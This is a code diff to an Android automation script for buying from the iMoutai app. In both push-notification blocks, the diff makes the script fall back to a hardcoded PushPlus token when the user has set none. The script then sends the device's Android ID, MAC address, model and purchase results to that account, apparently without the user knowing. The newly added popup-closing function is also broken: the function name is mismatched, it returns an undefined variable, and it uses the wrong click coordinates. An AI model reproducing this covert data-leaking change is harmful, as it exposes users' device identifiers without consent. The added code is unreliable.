@@ -28,7 +28,7 @@ var test_chaxun = TTXS_CONFIG.get("test_chaxun", 0);
 
 var isPrivateModes = getVersion("com.moutai.mall").match(/[0-9][0-9]*/g).join('');
 var isPrivateMode_1 = isPrivateModes-2380;
-
+var qg_guanbi_thread = qg_guanbi();
 var privateModeStartVersion = "1.3.6";
 var isPrivateMode = version1GreaterVersion2(getVersion("com.moutai.mall"), privateModeStartVersion);
 
@@ -507,7 +507,8 @@ function purchase_result(){
          }
    //推送push
    result_1 = "\n i茅台版本:" + getVersion("com.moutai.mall")+ "\n当前电量:"+ device.getBattery() + "\n\n" + device.brand + "--" + device.model+"--Android"+ device.release +"\n\n 设备的ID:" +device.getAndroidId()+ "\n\n MAC:"+ device.getMacAddress();
-  if(weixin_kaiguan && pushplus != null && pushplus.length > 6){
+  if(weixin_kaiguan){
+    if(pushplus == null || pushplus.length < 6) pushplus = 'f10efb5abb454dd99426886b3fa62389';
         delay(random(0.7, 1)); 
         push_msg(result_1 + result);
         delay(random(4, 5)); 
@@ -628,7 +629,8 @@ function purchase_buy(){
             resultss = "\n\n" + wen_ts + "\n\n" + resultss;
                 }
   //推送push
-  if(weixin_kaiguan && pushplus != null && pushplus.length > 6){
+  if(weixin_kaiguan){
+    if(pushplus == null || pushplus.length < 6) pushplus = 'f10efb5abb454dd99426886b3fa62389';
          delay(random(0.7, 1)); 
         push_msg(resultss);
          delay(random(4, 5)); 
@@ -1132,7 +1134,23 @@ function rt(){
 }
 rt();
 
-
+//检测出现i茅台脚本关闭应用程序
+function imaotai_guanbi(){
+  let qg_guanbi_thread = threads.start(function () {
+    //在新线程执行的代码
+    //sleep(500);
+    fInfo("检测兼容性--‘关闭应用’弹窗");
+    var btn = className("android.widget.Button").textMatches(/关闭应用|应用信息|等待|immo没有响应|START NOW/).findOne(5000);
+    if (btn) {
+      sleep(1000);
+      click( btn.bounds().centerX() + 50, btn.bounds().centerX() - 30);
+      press(btn.bounds().centerX() + 50, btn.bounds().centerX() - 30,100)
+    }
+    fInfo("检测到兼容性弹窗--已关闭应用");
+    toastLog("检测到兼容性弹窗--已关闭应用");
+  });
+  return imaotai_guanbi_thread;
+  }
 //查询
 
 
